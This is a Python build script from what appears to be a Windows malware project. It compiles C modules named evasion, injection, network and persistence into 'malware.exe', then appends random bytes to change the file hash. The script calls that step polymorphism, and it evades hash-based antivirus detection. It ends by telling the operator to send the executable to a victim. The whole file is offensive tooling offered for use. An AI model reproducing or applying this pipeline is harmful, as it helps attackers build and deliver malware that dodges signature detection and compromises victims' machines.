import os
import subprocess
import random
import hashlib

def get_sha256(filepath):
    sha256_hash = hashlib.sha256()
    with open(filepath, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()

print("[*] 1. Compiling C code...")

# get absolute paths
script_dir = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.abspath(os.path.join(script_dir, ".."))
code_dir = os.path.join(project_root, "code")

# output files saved in the project root
compiled_exe = os.path.join(project_root, "compiled.exe")
final_exe = os.path.join(project_root, "malware.exe")

compile_cmd = [
    "x86_64-w64-mingw32-gcc",
    os.path.join(code_dir, "evasion.c"),
    os.path.join(code_dir, "injection.c"),
    os.path.join(code_dir, "network.c"),
    os.path.join(code_dir, "persistence.c"),
    os.path.join(code_dir, "main.c"),
    "-o", compiled_exe,
    "-mwindows" # note: remove mwindows for debugging
]

subprocess.run(compile_cmd, check=True)
base_hash = get_sha256(compiled_exe)
print(f"[+] Compleated! Original Hash: {base_hash}")

print("\n[*] 2. Applying Polymorphism...")
with open(compiled_exe, "rb") as f:
    exe_content = f.read()

# generate 16 to 64 random byte
junk_size = random.randint(16, 64)
junk_bytes = os.urandom(junk_size)

mutated_content = exe_content + junk_bytes

with open(final_exe, "wb") as f:
    f.write(mutated_content)

final_hash = get_sha256(final_exe)
print(f"[+] Generated Payload: {final_exe}")
print(f"[+] New SHA-256 Hash: {final_hash}")

# cleanup
os.remove(compiled_exe)
print("\n[+] Operation compleated. Send 'malware.exe' to victim!")
